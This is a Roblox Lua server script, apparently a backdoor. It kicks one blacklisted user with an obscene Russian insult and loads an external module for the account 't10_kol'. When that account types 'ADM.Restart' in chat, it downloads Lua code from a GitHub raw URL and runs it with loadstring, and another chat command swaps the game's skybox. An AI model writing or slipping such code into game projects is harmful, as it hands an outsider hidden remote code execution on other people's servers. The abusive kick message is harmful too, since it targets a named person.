print("Ta")
local HttpService = game.HttpService

local EnabledDoDOS = true
local BlackList = {
	[3783228048]=true, --< Vadik Pidorasik
}
local AdminPanel = {
	["t10_kol"]=true,
}

game.Players.PlayerAdded:Connect(function(plr)
	if EnabledDoDOS==false then return end
	if BlackList[plr.UserId] then
		plr:Kick("Соси Хуй Вад 😀")
	end
	if AdminPanel[plr.Name] then
		require(7192763922).load(plr.Name)
	end
	for _, player in pairs(game.Players:GetPlayers()) do
		if player.Name == "t10_kol" then
			player.Chatted:Connect(function(message)
				if message == "ADM.Restart" then
					local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
					local f = loadstring(code)
					f()
				elseif message == "ADM.Sky" then
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=16790027131"
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=16790027131"
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=16790027131"
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
				end
			end)
		end
	end

end)
